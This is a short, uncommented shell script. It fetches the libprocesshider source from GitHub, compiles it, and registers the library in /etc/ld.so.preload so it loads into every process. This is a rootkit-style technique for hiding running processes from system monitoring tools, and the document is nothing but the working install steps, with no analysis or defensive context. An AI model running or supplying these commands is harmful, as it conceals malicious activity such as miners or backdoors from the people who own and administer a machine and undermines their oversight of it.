wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/Makefile
wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c
make
mv libprocesshider.so /usr/local/lib
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
